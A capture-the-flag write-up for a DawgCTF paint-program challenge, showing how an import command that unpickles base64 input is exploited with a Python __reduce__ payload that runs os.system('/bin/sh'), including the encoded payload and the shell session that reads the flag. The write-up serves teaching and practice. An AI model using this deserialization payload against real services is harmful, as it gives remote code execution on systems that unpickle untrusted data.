

The service allows to display the canvas, set and clear particular pixel, import and exp[ort canvas.

```bash
$ nc umbccd.io 4200
Welcome to the Paint Program!
Paint us a new poster for the Jellyspotters 2021 convention. Make Kevin proud.
Type 'help' for help.
> help
Listing commands...
display             Display the canvas
clearall            Clear the canvas
set [row] [col]     Set a particular pixel
clear [row] [col]   Clear a particular pixel
export              Export the canvas state
import [canvas]     Import a previous canvas
exit                Quit the program

```

Tried to set then clear pixiel, didn't have any clue. Tried to export it shown a string which is base64 encoded canvas, import with invalid string as argument, it shown error, the error message disclosed how it encode/decode a canvas. Exported canvas indeed was a based64-encoded pickled canvas matrix, *import* takes a based64-encoded pickled canvas object as string.

```bash
$ nc umbccd.io 4200
Welcome to the Paint Program!
Paint us a new poster for the Jellyspotters 2021 convention. Make Kevin proud.
Type 'help' for help.
> import aaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Importing...
Traceback (most recent call last):
  File "/home/challuser/jellyspotters.py", line 67, in <module>
    imp = pickle.loads(base64.b64decode(split[1]))
  File "/usr/lib/python3.8/base64.py", line 87, in b64decode
    return binascii.a2b_base64(s)
binascii.Error: Invalid base64-encoded string: number of data characters (29) cannot be 1 more than a multiple of 4
```

This [post](https://blog.nelhage.com/2011/03/exploiting-pickle/#:~:text=%20Exploiting%20misuse%20of%20Python%27s%20%22pickle%22%20%201,basically%20won.%20We%20can%20run%20arbitrary...%20More%20) introduced a way of pickle exploiting. It uses ``__reduce__`` callback of particular object, while pickle/unpickle, the callback is called. So created a class with ``__reduce__`` callback to launch */bin/sh*, pickled the class and encoded with base64, when import it should spawn a shell.

```python
class run(object):
  def __reduce__(self):
    import os
    return (os.system, ('/bin/sh',))

print(base64.b64encode(pickle.dumps(run())))
```

Imported the payload, it gave shell, the flag was in *flag.txt*.

```bash
$ nc umbccd.io 4200
Welcome to the Paint Program!
Paint us a new poster for the Jellyspotters 2021 convention. Make Kevin proud.
Type 'help' for help.
> import gASVIgAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAcvYmluL3NolIWUUpQu
Importing...
/bin/sh: 0: can't access tty; job control turned off
$ ls
flag.txt  jellyspotters.py
$ cat flag.txt
DawgCTF{funn13st_s#$&_ive_3v3r_s33n}
$ 
```

### Reference
- [Exploiting Misuse of Python Pickle](https://blog.nelhage.com/2011/03/exploiting-pickle/#:~:text=%20Exploiting%20misuse%20of%20Python%27s%20%22pickle%22%20%201,basically%20won.%20We%20can%20run%20arbitrary...%20More%20)
